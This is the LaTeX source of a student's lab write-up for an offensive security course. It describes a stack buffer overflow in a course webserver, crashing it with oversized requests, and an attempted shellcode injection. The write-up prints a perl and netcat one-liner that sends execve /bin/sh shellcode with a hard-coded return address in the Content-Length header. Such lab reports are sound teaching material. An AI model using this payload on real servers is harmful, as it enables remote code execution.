@@ -1,0 +1,137 @@
+\documentclass[a4paper,11pt,hidelinks]{article}
+%\usepackage[a-1b]{pdfx}
+\usepackage{hyperref}
+
+\usepackage{subfiles}
+\usepackage{epsfig}
+\usepackage{plain}
+\usepackage{setspace}
+%\usepackage{minted}
+\usepackage{listings}
+
+\usepackage{mdframed}
+\usepackage{caption}
+\usepackage{color}
+\usepackage{amsmath}
+\usepackage{amsthm}
+\usepackage{amssymb}
+\usepackage{amsfonts}
+\usepackage{mathabx}
+\usepackage{tcolorbox}
+\usepackage{multicol}
+\usepackage[english]{babel}
+\usepackage[left=2cm,right=2cm,top=2cm,bottom=1.8cm]{geometry}
+\usepackage{titlesec} 
+\usepackage[utf8x]{inputenc} 
+
+\hypersetup{colorlinks=true, urlcolor=blue}
+
+\captionsetup{
+  justification=centering,
+  singlelinecheck=false,
+  font=small,labelfont=bf,labelsep=space}
+
+\begin{document}
+
+\pagestyle{plain}
+
+\begingroup
+
+\renewcommand{\cleardoublepage}{}
+\renewcommand{\clearpage}{}
+
+\titleformat{\section}
+{\normalfont\Large\bfseries}{\thesection}{1em}{}
+
+
+\renewcommand{\lstlistingname}{Code}%
+\renewcommand{\lstlistlistingname}{List of \lstlistingname s}
+
+\definecolor{codeBackground}{rgb}{0.9, 0.9, 0.9}
+
+% Code environment
+\lstnewenvironment{code}[1]{
+  \mdframed[%
+    backgroundcolor=codeBackground,
+    shadow=false,
+    linecolor=black!40,
+    linewidth=2pt,
+    topline=false,
+    rightline=false,
+    leftline=false
+  ]%
+  \lstset{%
+    moredelim=**[is][\color{blue}]{**}{**},
+    moredelim=**[is][\color{teal}]{.-}{-.},
+    moredelim=**[is][\color{gray}]{||}{||},
+    frame=single,
+    framerule=0pt,
+    basicstyle=\ttfamily,
+    columns=fullflexible
+  }%
+}{% Spacing between and after caption + before end of mdframed
+  \vspace{-1em}
+  \endmdframed
+  \vspace{-0.5em}
+  \captionsetup{type=lstlisting}
+  \caption{#1}
+  \vspace{1.5em}
+  \ignorespaces
+}
+
+\newpage
+
+\title{BOF exercise}
+\author{Offensive Technologies 2021 \\
+  Matteo Franzil \texttt{<matteo.franzil@studenti.unitn.it>}}
+\maketitle
+
+\section{Solution}
+
+To solve the exercise, I first connected with a regular SSH connection:
+
+\begin{code}{Code for connecting and starting the server.}
+ssh otech2af@users.deterlab.net  
+ssh server.franzil-pathame.offtech
+
+cd /usr/lib/fhttpd/
+
+sudo make
+sudo ./webserver 8080
+\end{code}
+
+This time, we don't need GUIs: two shells are sufficient for completing the exercise. In the first, we proceed with compiling the webserver with \verb=sudo make= and starting it with \verb=sudo ./webserver=. We will leave the first shell there, waiting for the output.
+
+In the second shell, we can exploit the vulnerability as easily as sending an arbitrarily large request. Indeed, by inspecting the source code we learn that there are two bounded buffers, set to 1024 bytes each. The first can be found in the \verb=char *get_header()= method, the second in the \verb=int send_response()= method. By further inspecting what these two methods do, we can conclude that we can crash the server either by sending an oversized ($1024+$) path in our GET request, or by sending an oversized header (i.e., \verb=If-Modified-Since= or \verb=Content-Length=).
+
+\begin{figure}[h!]
+  \centering
+  \includegraphics[width=0.5\textwidth]{drawable/large-get.png}
+  \caption{Exploiting the vulnerability with a 1050-byte-sized payload: the server crashes with a \textit{bad file descriptor} error.}
+\end{figure}
+
+\begin{figure}[h!]
+  \centering
+  \includegraphics[width=0.5\textwidth]{drawable/large-get-2.png}
+  \caption{Exploiting the vulnerability with a 10000-byte-sized payload: the server crashes with a \textit{segmentation fault} error.}
+\end{figure}
+
+\section{Shellcode}
+
+It is additionally possible to exploit the vulnerability via injecting shell code in the Content-Length parameter (the path parameter is also vulnerable, although harder to exploit). In order to obtain the necessary parameters for a successful exploitation, I used \verb=gdb= on the \verb=webserver= executable, placing a breakpoint at line \verb=88= in order to learn the address of the \verb=rip= (return instruction pointer) address. For the shell code, I used the following one: \url{http://shell-storm.org/shellcode/files/shellcode-106.php}. The obtained script looked like this:
+
+\begin{code}{Code for the exploitation.}
+  perl -e 'print "POST \/ HTTP\/1.1\r\n
+  Content-Length: \x48\x31\xc0\x99\xb0\x3b\x48\xbf
+  \x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08
+  \x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05"
+   . "A"x1097
+   . "\xd0\xf9\x5a\xf7\xff\x7f"
+   . "\r\n\r\n"' | nc -v -v -q 2 localhost 8080
+\end{code}
+
+This code makes a request whose Content-Length header first contains the shell code, then some random As - enough to overflow the buffer and barely touch the \verb=rip= registry - finally, the address of the start of the buffer and two \verb=CRLF=. However, I wasn't able to fully reproduce the vulnerability, due to repeated segmentation fault.
+
+
+\endgroup
+\end{document}
